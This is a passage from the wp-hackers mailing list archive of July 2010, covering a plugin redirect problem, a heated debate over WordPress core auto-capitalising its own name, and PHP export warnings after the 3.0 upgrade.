References: <AANLkTinqv1mW4Ws8XzJ9DIG0UN-TX_lwdkc2prHDg1a6@mail.gmail.com><AANLkTilWOeF6vXIre90JId1yLk71gduhXyEg0fsaCKxT@mail.gmail.com><AANLkTikCQGsRV-bltw6tuolLq6pREtZogCErERXXYFtv@mail.gmail.com><CD47955B7E065D48AB5CF226C2ED75C02E2FD0@tbs-sbs01.TBS.local>
	<AANLkTinLZ5Fm3gkWX33jSpC0aKOjZ2uPp5goCOltGINC@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FDC@tbs-sbs01.TBS.local>

Thanks for the clarification mccormicky.

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of mccormicky
Sent: 07 July 2010 14:25
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Home redirects to new page on WP 3.0

OP mailapera and I emailed off list (after he was told to go away) and
it
turned out it was an issue with a plugin, the 404 was not caused by
upgrading to WordPress 3.0  and any "bugs" were with the redirection
plugin
not being de activated while he was trying to troubleshoot the problem.


On Wed, Jul 7, 2010 at 4:20 AM, Gavin Pearce
<Gavin.Pearce at 3seven9.com>wrote:

> Hi,
>
> Please ignore the below information from mccormicky - it's incorrect.
>
> mccormicky - I appriciate your support in here, but if you're going to
> make arrogant remarks about a core-topic then please at least offer
> correct advice.
>
> I can understand slight errors, everyone makes them - but this is the
> second time in as many days that you've offered completely incorrect
> information, that doesn't even have *any* backing or grounds.
>
> That said, thanks for trying, but it's worth saying you're not sure
when
> you're not sure.   : )
>
> Best wishes,
> Gavin
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of
mccormicky
> Sent: 06 July 2010 20:24
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Home redirects to new page on WP 3.0
>
> Oh whatever. They can talk about P for 4 days but someone can't help
> someone
> else.
> It isn't WordPress and it is not a bug.
> You're confusing your server.
>
> Page Title: Experience Tuscany
> Page Slug:  experience-tuscany
> Domain: thriftytuscany.com
> Sub-Domain: experience-tuscany
> URL: http://experience-tuscany.thriftytuscany.com/experience-tuscany
>
> If you make the slug different than experience-tuscany you won't get a
> 404
>
>
>
>
>
>
>
>
> On Tue, Jul 6, 2010 at 2:13 PM, Michael D Adams <mda at blogwaffe.com>
> wrote:
>
> > On Tue, Jul 6, 2010 at 9:27 AM, mailapera <mailapera at gmail.com>
wrote:
> > > I installed 3.0 and after creating a new page, additional to those
I
> > > already had prior to the upgrade to 3.0, my homepage redirects to
> that
> > > newly created page with a 301 permanent redirect. If I delete the
> page
> > > the redirect stays and produces a 404 error each time I try to
visit
> > > the homepage. To eliminate the error I have to go in the DB and
> delete
> > > the 301 entry.
> >
> > This list is not a support list.
> >
> > You have a problem with Redirects.  Do you have any redirection
> > plugins installed?  Have you tried looking through the source of
your
> > plugins to find mentions of the wp_redirection_items and
> > wp_redirection_modules tables (these are not core tables)?
> >
> > My guess is that this is a problem with Urban Giraffe's Redirection
> > plugin http://urbangiraffe.com/plugins/redirection/  Do you have
that
> > plugin installed? If you disable the plugin, does the problem go
away
> > (always a good debugging step).
> >
> > Here's a link which addresses what sounds like your problem.
> >
> >
> >
>
http://urbangiraffe.com/support/topic/home-page-is-redirecting-to-anothe
>
r-wp-page-without-my-instruction-to-do-so<http://urbangiraffe.com/suppor
t/topic/home-page-is-redirecting-to-anothe%0Ar-wp-page-without-my-instru
ction-to-do-so>
> >
> > If it is this plugin that's causing the problem, I suggest you move
> > your discussion to those support forums as the people there will be
> > able to help you better.  If they can fix your problem, please also
> > post a note on your WordPress.org forums thread so that people
> > searching that site can get the answer they need.
> >
> > Please also direct future support inquiries to the proper channels.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From m at mullenweg.com  Wed Jul  7 14:44:05 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed, 07 Jul 2010 10:44:05 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061329.26694.chip@chipbennett.net>	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>	<201007061440.59637.chip@chipbennett.net>	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
Message-ID: <4C3492B5.2000108@mullenweg.com>

On 7/7/2010 9:11 AM, Stephen Rider wrote:
> I laughed when Matt said we were approaching Godwin's Law. :-)  Some of the rhetoric is getting a bit overwrought, but for the most part I think it's remained pretty civil.

We are -- someone is comparing the capitalization of the letter P with 
removing the sacred freedoms every WordPress user is given by the GPL. 
If you're someone who is frequently personally attacked, lied about, 
having cartoons drawn about you, etc for trying to protect that freedom 
it pushes it too far. There is a huge magnitude of difference.

The rest of your message is a bit long to respond to individually, but 
in summary:

Core development is a meritocracy. People pay their dues by working on 
*hard* issues that matter to end-users, like widgets, upgrades, speed 
and performance, and then they're then trusted with increasing rights 
and responsibilities.

The more attention paid to a trivial issue by a new contributor, hence 
the more distraction from the core people on the things that matter, 
that new contributor is spending their default community currency on 
something that is generating no returns.

If you want to map the decline of this mailing list, to the point it 
might as well be shut down, look at the number of words generated by 
people who don't contribute to core over time, or over "bikeshed" issues 
that don't really matter. ( http://bikeshed.com/ ) (And also the 
atrocious email etiquette and quoting style that's taken over here.)

Eventually, the good people unsubscribe entirely, or go silent for 
months/years at a time. Why? Because they didn't get involved with 
WordPress because they love arguing on mailing lists. I'm involved 
because I love making it easy for people to build beautiful dynamic 
websites. I'm involved because I think the more people publishing, the 
better place the world will be. I'm involved because I love figuring out 
elegant code or architecture solutions to tricky problems or UI challenges.

So you withdraw. This thread would have been much much shorter, and 
probably better for everyone's perception, if I hadn't participated at all.

If you're lucky, the people that withdraw from forums and mailing lists 
just focus on code. If you're unlucky they find another pursuit that's 
more fun and has less politics.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From dragonfly at dragonflyeye.net  Wed Jul  7 14:52:09 2010
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Wed, 7 Jul 2010 10:52:09 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3492B5.2000108@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
Message-ID: <AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>

Wait, Matt, holy crap.

You've spent the better part of two days fueling a debate that would have
been long-dead without you engaging and then you bemoan the civility and
quality of this list's posting? I keep having to throw away emails that
contribute *absolutely nothing but a P* to WordPress or my life, but you
claim the moral high ground?

Its your company, I suppose.

From jbloch at olympianetworks.com  Wed Jul  7 15:05:12 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Wed, 7 Jul 2010 11:05:12 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
	<AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
Message-ID: <C460819D-42BB-4979-9B3D-4374ABF018FD@olympianetworks.com>

WordPress isn't Matt's company, it's the community's project. This addition to core was discussed in dev chats just like every other addition in WordPress. Like Matt said, WordPress development is a meritocracy. If you wanted to influence the direction of core, you should contribute and earn the respect that will get you that influence. I've been watching this thread for the last two days and think this is the silliest argument I've ever seen. If you don't like the filter, remove it! It's one line of code. Did you know that WordPress also changes regular quotes to curly quotes with a filter, and -- to en-dash and --- to em-dash and ... to elipses?! OH THE INHUMANITY!!!

On Jul 7, 2010, at 10:52 AM, Thomas Belknap wrote:

> Wait, Matt, holy crap.
> 
> You've spent the better part of two days fueling a debate that would have
> been long-dead without you engaging and then you bemoan the civility and
> quality of this list's posting? I keep having to throw away emails that
> contribute *absolutely nothing but a P* to WordPress or my life, but you
> claim the moral high ground?
> 
> Its your company, I suppose.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mark at simplercomputing.net  Wed Jul  7 15:05:30 2010
From: mark at simplercomputing.net (Mark E)
Date: Wed, 07 Jul 2010 09:05:30 -0600
Subject: [wp-hackers] Fwd: Re:  Putting the P in WordPress
Message-ID: <4C3497BA.2090704@simplercomputing.net>



On 07/07/2010 08:12 AM, Matt Mullenweg wrote:
> On 7/7/2010 4:48 AM, Gavin Pearce wrote:
>> *******
>> *** What do we really actually gain from this function? Seriously?
>> *******
>
> The correct capitalization of WordPress all over the web. A small easter
> egg that makes the people who care about such things happy. (It also
> increases participation on Trac.)

The obfuscation of the easter egg blatantly violates GPL v2. So all the
stuff you say about GPL boils down to this: "Do as I as say, not as I
do". And here I was thinking that you followed GPL to the letter, as you 
imply other people should do.

http://core.trac.wordpress.org/ticket/12816

> Does that make sense?

No. There's no sense in you making these counter arguments around the 
matter and trying to downplay the issue as trivial or bad juju for 
gaining new core developers (nevermind that some us have bills to pay 
and no free time to write core code). Just tell it like it is on this 
issue because it's pretty apparent already - to some people anyway. 
Everything you've written on this issue can be summarized (and already 
has) as the fact that you personally want a one-word speller checker in 
the core code and that's all that matters - oooo, a pun.

Mark


From mark at simplercomputing.net  Wed Jul  7 15:07:05 2010
From: mark at simplercomputing.net (Mark E)
Date: Wed, 07 Jul 2010 09:07:05 -0600
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<201007061329.26694.chip@chipbennett.net>	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>	<201007061440.59637.chip@chipbennett.net>	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>	<4C3492B5.2000108@mullenweg.com>
	<AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
Message-ID: <4C349819.50702@simplercomputing.net>



On 07/07/2010 08:52 AM, Thomas Belknap wrote:
> Wait, Matt, holy crap.
>
> You've spent the better part of two days fueling a debate that would have
> been long-dead without you engaging and then you bemoan the civility and
> quality of this list's posting? I keep having to throw away emails that
> contribute *absolutely nothing but a P* to WordPress or my life, but you
> claim the moral high ground?
>
> Its your company, I suppose.


On 07/06/2010 Mark wrote:

 > Sometimes people with a little bit of power get out of control
 > because of ego and other personal problems - and it's always our
 > fault for not seeing it their way.



From Gavin.Pearce at 3seven9.com  Wed Jul  7 15:13:03 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Wed, 7 Jul 2010 16:13:03 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <C460819D-42BB-4979-9B3D-4374ABF018FD@olympianetworks.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><201007061329.26694.chip@chipbennett.net><CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local><201007061440.59637.chip@chipbennett.net><2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de><609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com><4C3492B5.2000108@mullenweg.com><AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
	<C460819D-42BB-4979-9B3D-4374ABF018FD@olympianetworks.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FDE@tbs-sbs01.TBS.local>

> WordPress isn't Matt's company, it's the community's project.

Sure doesn't seem that way here ...

> If you wanted to influence the direction of core, you should
contribute and earn the respect that will get you that influence.

I thought you just said this was a community driven project, not one
directed by a small number of core people with 'influence'?

> WordPress also changes regular quotes to curly quotes with a filter,
and -- to en-dash and --- to em-dash and ... to elipses?! OH THE
INHUMANITY!!!

That's not written content as such though - which is the issue here.
(Though I must admit to having that switched off also).

Gav

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
Sent: 07 July 2010 16:05
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

WordPress isn't Matt's company, it's the community's project. This
addition to core was discussed in dev chats just like every other
addition in WordPress. Like Matt said, WordPress development is a
meritocracy. If you wanted to influence the direction of core, you
should contribute and earn the respect that will get you that influence.
I've been watching this thread for the last two days and think this is
the silliest argument I've ever seen. If you don't like the filter,
remove it! It's one line of code. Did you know that WordPress also
changes regular quotes to curly quotes with a filter, and -- to en-dash
and --- to em-dash and ... to elipses?! OH THE INHUMANITY!!!

On Jul 7, 2010, at 10:52 AM, Thomas Belknap wrote:

> Wait, Matt, holy crap.
> 
> You've spent the better part of two days fueling a debate that would
have
> been long-dead without you engaging and then you bemoan the civility
and
> quality of this list's posting? I keep having to throw away emails
that
> contribute *absolutely nothing but a P* to WordPress or my life, but
you
> claim the moral high ground?
> 
> Its your company, I suppose.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From chip at chipbennett.net  Wed Jul  7 15:16:57 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Wed, 7 Jul 2010 10:16:57 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3492B5.2000108@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
Message-ID: <201007071016.57615.chip@chipbennett.net>

On Wednesday 07 July 2010 9:44:05 am Matt Mullenweg wrote:
> On 7/7/2010 9:11 AM, Stephen Rider wrote:
> > I laughed when Matt said we were approaching Godwin's Law. :-)  Some of
> > the rhetoric is getting a bit overwrought, but for the most part I think
> > it's remained pretty civil.
> 
> We are -- someone is comparing the capitalization of the letter P with
> removing the sacred freedoms every WordPress user is given by the GPL.

If you want us to believe that you are being sincere and empathetic, and not 
snide and dismissive, it would be incredibly helpful if you would refrain from 
misrepresenting others' positions.

I never said that a filter to capitalize the "P" in WordPress was comparable 
to removing the sacred freedoms... given by the GPL. Rather, I said that 
adding to core a filter that editorially changes the end user's content 
without the user's knowledge or consent is diametrically opposite to the 
philosophy of free software, which states that in all matters it is the user's 
purposes that matter, and not the developer's purposes.

By changing my words, you (intentionally or unintentionally) present a straw 
man. By pre-emptively invoking Godwin's law, you attempt to discredit the 
straw man you have thus presented.

It would be far better for you to address my actual assertion, rather than 
waste your time demolishing straw men.

How does putting this filter into core act to serve any end-user purpose 
whatsoever? Under what justification is this filter anything other than an 
exercise in forcing the developer's purpose on  - and as superior to - the 
user's purpose?

I find this argument unpersuasive:

> > *******
> > *** What do we really actually gain from this function? Seriously?
> > *******
> 
> The correct capitalization of WordPress all over the web. A small easter
> egg that makes the people who care about such things happy. (It also
> increases participation on Trac.)

If *end users* were concerned with the correct capitalization of WordPress all 
over the web, then they would have installed Ozh' plugin sometime during the 
past three years. Or they would have added a rule to their spell-checker.

> If you're someone who is frequently personally attacked, lied about,
> having cartoons drawn about you, etc for trying to protect that freedom
> it pushes it too far. There is a huge magnitude of difference.

My statement that your defense of this filter being added to core is 
hypocritical in no way compares you to Hitler or in any other way represents 
ad hominem. I understand that you have been the object of much criticism. I 
also understand that such criticism has been both deserved and undeserved. I 
understand that you are very likely weary of and sensitive to any such 
additional criticism. Anyone in your position would be, also.
> 
> The rest of your message is a bit long to respond to individually, but
> in summary:
> 
> Core development is a meritocracy. People pay their dues by working on
> *hard* issues that matter to end-users, like widgets, upgrades, speed
> and performance, and then they're then trusted with increasing rights
> and responsibilities.
> 
> The more attention paid to a trivial issue 

Here's where the huge disconnect exists: users and developers do not consider 
either arbitrary breakage of content, or undisclosed and unapproved 
editorializing of user content to be trivial issues.

Again, it is the slippery slope: if the core development team would change 
some content without disclosure or authorization, then the probability 
increases that, in the future, the core development team would similarly 
change other content.

(Or do you think that the WordPress project is immune to the ethical downslide 
that befell the "do no evil" Google?)

This is not a trivial issue; rather, it is a *serious* issue  - primarily due 
to your response, which represents an absolute disregard for the stated desire 
of the community, and for the philosophical concerns being expressed.

Bottom line: changing user content without disclosure and authorization is 
BAD. If you would recognize this principle, then this issue very much could 
return to being trivial.

> If you're lucky, the people that withdraw from forums and mailing lists
> just focus on code. If you're unlucky they find another pursuit that's
> more fun and has less politics.

The developers that I've heard discussing this issue only mention withdrawing 
in the context of doing so because they have lost trust in the direction the 
WordPress project is taking, because of leadership decisions represented by 
this would-be trivial issue.

From cross at thisismyurl.com  Wed Jul  7 15:18:28 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Wed, 7 Jul 2010 12:18:28 -0300
Subject: [wp-hackers] Export errors (3.0 / multisite)
Message-ID: <1614E53E-C7A4-4272-86C4-CBE5381CF078@thisismyurl.com>

<br />
<b>Warning</b>:  Illegal offset type in <b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php</b> on line <b>176</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in <b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b> on line <b>44</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in <b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b> on line <b>45</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in <b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b> on line <b>46</b><br />
<?xml version="1.0" encoding="UTF-8"?>
<!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your blog. -->
<!-- It contains information about your blog's posts, comments, and categories. -->
<!-- You may use this file to transfer that content from one site to another. -->
<!-- This file is not intended to serve as a complete backup of your blog. -->


This is the first time I've tried doing an export since the 3.0 update, is anybody else seeing an error like this or is it specific to my configuration?

c.
__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From uehlein at gmail.com  Wed Jul  7 15:24:46 2010
From: uehlein at gmail.com (Bob Uehlein)
Date: Wed, 07 Jul 2010 11:24:46 -0400
Subject: [wp-hackers] Export errors (3.0 / multisite)
In-Reply-To: <1614E53E-C7A4-4272-86C4-CBE5381CF078@thisismyurl.com>
References: <1614E53E-C7A4-4272-86C4-CBE5381CF078@thisismyurl.com>
Message-ID: <4C349C3E.7090700@gmail.com>

I was getting this error this weekend. I went into trac and got the 
latest export.php and replaced my current with that one. Worked fine then.



On 7/7/10 11:18 AM, Christopher Ross wrote:
> <br />
> <b>Warning</b>:  Illegal offset type in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php</b>  on line<b>176</b><br />
> <br />
> <b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>  on line<b>44</b><br />
> <br />
> <b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>  on line<b>45</b><br />
> <br />
> <b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-includes/taxonomy.php:176) in<b>/nfs/c04/h02/mnt/79950/domains/webtest.christopherross.ca/html/wp-admin/includes/export.php</b>  on line<b>46</b><br />
> <?xml version="1.0" encoding="UTF-8"?>
> <!-- This is a WordPress eXtended RSS file generated by WordPress as an export of your blog. -->
> <!-- It contains information about your blog's posts, comments, and categories. -->
> <!-- You may use this file to transfer that content from one site to another. -->
> <!-- This file is not intended to serve as a complete backup of your blog. -->
>
>
> This is the first time I've tried doing an export since the 3.0 update, is anybody else seeing an error like this or is it specific to my configuration?
>
> c.
> __
>
> Christopher Ross
>
> Toronto      1 (416) 840-5828
> Fredericton 1 (506) 474-2708
>
> http://christopherross.ca
> http://www.thisismyurl.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From jbloch at olympianetworks.com  Wed Jul  7 15:27:47 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Wed, 7 Jul 2010 11:27:47 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E2FDE@tbs-sbs01.TBS.local>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com><201007061329.26694.chip@chipbennett.net><CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local><201007061440.59637.chip@chipbennett.net><2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de><609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com><4C3492B5.2000108@mullenweg.com><AANLkTilaWxOjWuk33mRae9HJNxLfhBGouhwiBukARAWm@mail.gmail.com>
	<C460819D-42BB-4979-9B3D-4374ABF018FD@olympianetworks.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FDE@tbs-sbs01.TBS.local>
Message-ID: <D91265CD-9B6B-4B29-AA34-7835E54E6D79@olympianetworks.com>

Yes it's a community. Like any other community, there are leaders and prominent figures in that community. Take Andrew Nacin, for example. Hardly anybody knew his name a year ago. And now he's a core contributor, because he earned that respect. Nobody's going to stop you from joining the community and becoming a prominent voice, but nobody will listen to someone who contributes nothing productive. I'm not saying you have nothing to contribute, but trashing Matt and the rest of the devs for their contributions doesn't help, especially if you didn't participate in that discussion to begin with.

Changing Wordpress to WordPress is not something to get up in arms about. I know people that replace lists of offensive words with four asterisks. Can they now not use WordPress because they're violating the written contents of those writers? That seems like a bigger violation of 'written content' than this, doesn't it?

On Jul 7, 2010, at 11:13 AM, Gavin Pearce wrote:

>> WordPress isn't Matt's company, it's the community's project.
> 
> Sure doesn't seem that way here ...
> 
>> If you wanted to influence the direction of core, you should
> contribute and earn the respect that will get you that influence.
> 
> I thought you just said this was a community driven project, not one
> directed by a small number of core people with 'influence'?
> 
>> WordPress also changes regular quotes to curly quotes with a filter,
> and -- to en-dash and --- to em-dash and ... to elipses?! OH THE
> INHUMANITY!!!
> 
> That's not written content as such though - which is the issue here.
> (Though I must admit to having that switched off also).
> 
> Gav
> 
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Bloch
> Sent: 07 July 2010 16:05
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Putting the P in WordPress
> 
> WordPress isn't Matt's company, it's the community's project. This
> addition to core was discussed in dev chats just like every other
> addition in WordPress. Like Matt said, WordPress development is a
> meritocracy. If you wanted to influence the direction of core, you
> should contribute and earn the respect that will get you that influence.
> I've been watching this thread for the last two days and think this is
> the silliest argument I've ever seen. If you don't like the filter,
> remove it! It's one line of code. Did you know that WordPress also
> changes regular quotes to curly quotes with a filter, and -- to en-dash
> and --- to em-dash and ... to elipses?! OH THE INHUMANITY!!!
> 
> On Jul 7, 2010, at 10:52 AM, Thomas Belknap wrote:
> 
>> Wait, Matt, holy crap.
>> 
>> You've spent the better part of two days fueling a debate that would
> have
>> been long-dead without you engaging and then you bemoan the civility
> and
>> quality of this list's posting? I keep having to throw away emails
> that
>> contribute *absolutely nothing but a P* to WordPress or my life, but
> you
>> claim the moral high ground?
>> 
>> Its your company, I suppose.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From zamoose at gmail.com  Wed Jul  7 15:28:49 2010
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 7 Jul 2010 11:28:49 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C3492B5.2000108@mullenweg.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<201007061329.26694.chip@chipbennett.net>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FC7@tbs-sbs01.TBS.local>
	<201007061440.59637.chip@chipbennett.net>
	<2012340632.117837.1278447169712.JavaMail.open-xchange@oxusltgw10.schlund.de>
	<609CDAE8-6D93-47CA-8DC3-0F1F01DD5FD6@striderweb.com>
	<4C3492B5.2000108@mullenweg.com>
Message-ID: <AANLkTinjWXFvhqCaQEWUrIiN3i-LESqJ-BBK8z1OZECE@mail.gmail.com>

On 7/7/10, Matt Mullenweg <m at mullenweg.com> wrote:
> On 7/7/2010 9:11 AM, Stephen Rider wrote:
>> I laughed when Matt said we were approaching Godwin's Law. :-)  Some of
>> the rhetoric is getting a bit overwrought, but for the most part I think
>> it's remained pretty civil.
>
> We are -- someone is comparing the capitalization of the letter P with
> removing the sacred freedoms every WordPress user is given by the GPL.
> If you're someone who is frequently personally attacked, lied about,
> having cartoons drawn about you, etc for trying to protect that freedom
> it pushes it too far. There is a huge magnitude of difference.
>

You're doing it wrong. Not a single soul brought out a comparison to
Hitler or Nazis.

http://en.wikipedia.org/wiki/Godwins_Law

"As an online discussion grows longer, the probability of a comparison
involving Nazis or Hitler approaches 1."

You self-Godwinned, thus I invoke Quirk's Exception.

> The rest of your message is a bit long to respond to individually, but
> in summary:
>
> Core development is a meritocracy. People pay their dues by working on
> *hard* issues that matter to end-users, like widgets, upgrades, speed
> and performance, and then they're then trusted with increasing rights
> and responsibilities.
>
> The more attention paid to a trivial issue by a new contributor, hence
> the more distraction from the core people on the things that matter,
> that new contributor is spending their default community currency on
> something that is generating no returns.
>

I thought "we" were taking a release cycle off to work on community
issues. What better time than when the core devs have no pressing code
need?


> If you want to map the decline of this mailing list, to the point it
> might as well be shut down, look at the number of words generated by
> people who don't contribute to core over time, or over "bikeshed" issues
> that don't really matter. ( http://bikeshed.com/ ) (And also the
> atrocious email etiquette and quoting style that's taken over here.)
>

So then shutter Hackers. If it's really the wretched hive of scum and
villainy that folks make it out to be, nuke it from orbit.

> Eventually, the good people unsubscribe entirely, or go silent for
> months/years at a time. Why? Because they didn't get involved with
> WordPress because they love arguing on mailing lists. I'm involved
> because I love making it easy for people to build beautiful dynamic
> websites. I'm involved because I think the more people publishing, the
> better place the world will be. I'm involved because I love figuring out
> elegant code or architecture solutions to tricky problems or UI challenges.
>

Your suggestion that those who disagree with you DON'T value those
things truly rankles.  If you're trying to engender reasoned debate
and healthy contributions, publicly impugning others' motives is a
lousy way to start.


-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From dougal at gunters.org  Wed Jul  7 15:31:13 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Wed, 07 Jul 2010 11:31:13 -0400
Subject: [wp-hackers] Putting the H in WordPress-Hackers
Message-ID: <4C349DC1.4010205@gunters.org>

Can we be done with the 'P' discussion now? Please?

I would make an educated guess that 99% of WordPress users in the world 
honestly don't give a flying flip whether or not the software 
automatically puts the proper case on the word "WordPress". And probably 
